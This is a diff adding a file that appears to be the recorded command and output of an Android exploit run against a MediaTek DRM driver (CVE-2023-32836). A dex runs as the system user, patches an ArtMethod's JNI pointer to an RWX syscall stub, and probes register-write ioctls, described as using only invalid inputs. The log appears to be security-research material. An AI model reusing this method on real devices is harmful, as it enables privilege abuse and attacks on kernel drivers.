@@ -1,0 +1,46 @@
+command=CLASSPATH=/data/data/com.android.settings/cache/drm_trigger.dex app_process64 /system/bin DrmTrigger mtkwriteguard
+probe=drm-trigger
+dex_md5=e8fafa81c3bd601152bd1088a88d3ded
+dex_sha256=7e72ea4e79a479603fb966faccc8727cd39ae41284690d7296ee18043832cdec
+remote_dex=/data/data/com.android.settings/cache/drm_trigger.dex
+shell_port=127.0.0.1:48888
+exit_status=0
+
+uid=1000(system) gid=1000(system) groups=1000(system),3003(inet) context=u:r:system_app:s0
+u:r:system_app:s0
+e8fafa81c3bd601152bd1088a88d3ded  /data/data/com.android.settings/cache/drm_trigger.dex
+[*] CVE-2023-32836 DRM exploit (Java/dalvikvm)
+[*] pid=13669 uid=1000 mode=mtkwriteguard
+[*] === MTK private DRM write-guard probe (safe invalid inputs) ===
+
+[*] Uses intentionally invalid register addresses/ids only.
+[+] Scratch buffer at 0x749e210000
+[*] Trying anonymous PROT_RWX mmap...
+[+] Anonymous RWX page at 0x749e0c1000
+[+] Wrote syscall stub: JNI@+0x00 (36B), call stub JNI@+0x80 (40B); entry_point left untouched
+[*] ArtMethod for nativeSyscall at 0x749a0f9880
+    access_flags = 0x10000108 [NATIVE]
+    data (JNI ptr) = 0x71f101a2c0
+    entry_point    = 0x1038000875b867e0
+[*] Patching data_ (JNI) → 0x749e0c1000
+    data_       = 0x749e0c1000 ✓
+    entry_point = 0x1038000875b867e0 (unchanged)
+[+] ArtMethod patched
+[+] Syscall infrastructure ready
+
+[*] openat /dev/dri/card0 ret=48
+[*] MTK_WRITE_REG invalid pa=0xffffffff ret=-14 (EFAULT)
+[*] MTK_READ_REG invalid pa=0xffffffff ret=-14 (EFAULT) val=0x0
+[*] MTK_WRITE_SW_REG unknown reg_id=0x12345678 ret=0
+[*] MTK_READ_SW_REG unknown reg_id=0x12345678 ret=0 val=0x0
+
+[*] DISP_COLOR0 Y_SLOPE registers (pa readback test):
+    pa=0x140074a0 ret=0 val=0x0
+    pa=0x140074a4 ret=0 val=0x0
+    pa=0x140074a8 ret=0 val=0x0
+    pa=0x140074ac ret=0 val=0x0
+    pa=0x140074b0 ret=0 val=0x0
+    pa=0x140074b4 ret=0 val=0x0
+    pa=0x140074b8 ret=0 val=0x0
+    pa=0x140074bc ret=0 val=0x0
+[*] Done
